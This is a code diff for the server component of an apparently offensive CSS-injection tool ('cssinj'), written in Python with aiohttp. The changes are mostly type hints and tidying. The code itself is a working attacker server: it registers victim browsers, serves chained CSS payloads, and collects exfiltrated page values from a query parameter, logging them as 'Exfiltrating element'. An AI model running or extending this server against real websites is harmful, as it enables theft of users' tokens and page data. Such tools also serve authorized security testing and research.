@@ -1,11 +1,10 @@
-from __future__ import annotations
-
 import argparse
 import asyncio
 import contextlib
 import signal
 
 from aiohttp import web
+from aiohttp.typedefs import Handler
 
 from cssinj.client import Client, Clients
 from cssinj.console import Console, LogLevel
@@ -62,16 +61,16 @@ class Server:
             await self.runner.cleanup()
         Console.log(LogLevel.SERVER, "Attacker's server stopped.")
 
-    async def handle_start(self, request):
+    async def handle_start(self, request: web.Request) -> web.Response:
         client = self.clients.register(
             Client(
-                host=request.remote,
-                accept=request.get('accept'),
+                host=request.remote or '?',
+                accept=request.headers.get('accept'),
                 headers=dict(request.headers),
                 event=asyncio.Event(),
             ),
         )
-        if self.output_file:
+        if self.output_file is not None:
             self.output_file.update()
         Console.log(LogLevel.CONNECTION, f'Connection from {client.host}')
         Console.log(LogLevel.CONNECTION_DETAILS, f'ID : {client.id}')
@@ -86,49 +85,42 @@ class Server:
             content_type='text/css',
         )
 
-    async def handle_end(self, request):
+    async def handle_end(self, request: web.Request) -> web.Response:
         client = self._get_client(request)
         body = self.strategy.handle_end(client)
-        if self.output_file:
+        if self.output_file is not None:
             self.output_file.update()
         client.event.set()
         return web.Response(text=body, content_type='text/css')
 
-    async def handle_next(self, request):
+    async def handle_next(self, request: web.Request) -> web.Response:
         client = self._get_client(request)
-
         client.counter += 1
-
         await client.event.wait()
-
         client.event.clear()
-
         return web.Response(
             text=self.strategy.generate_next_payload(client),
             content_type='text/css',
         )
 
-    async def handle_valid(self, request):
+    async def handle_valid(self, request: web.Request) -> web.Response:
         client = self._get_client(request)
         data = request.query.get('t')
+        if data is None:
+            raise web.HTTPBadRequest(text='missing t')
 
         client.event.set()
-
         self.strategy.handle_valid(client, data)
 
-        if self.output_file:
+        if self.output_file is not None:
             self.output_file.update()
-
         if self.show_details:
-            Console.log(
-                LogLevel.EXFILTRATION,
-                f'[{client.id}] - Exfiltrating element: {data}',
-            )
+            Console.log(LogLevel.EXFILTRATION, f'[{client.id}] - Exfiltrating element: {data}')
 
         return web.Response(text='ok', content_type='text/css')
 
     @web.middleware
-    async def error_middleware(self, request, handler):
+    async def error_middleware(self, request: web.Request, handler: Handler) -> web.StreamResponse:
         try:
             return await handler(request)
         except web.HTTPException:
@@ -137,7 +129,7 @@ class Server:
             Console.error_handler(ex, context={'source': 'middleware', 'path': request.path})
             return web.Response(text='500: Internal Server Error', status=500)
 
-    def _get_client(self, request) -> Client:
+    def _get_client(self, request: web.Request) -> Client:
         client = self.clients.get_by_id(request.query.get('cid'))
         if client is None:
             raise InjectionError('Unknown client id')
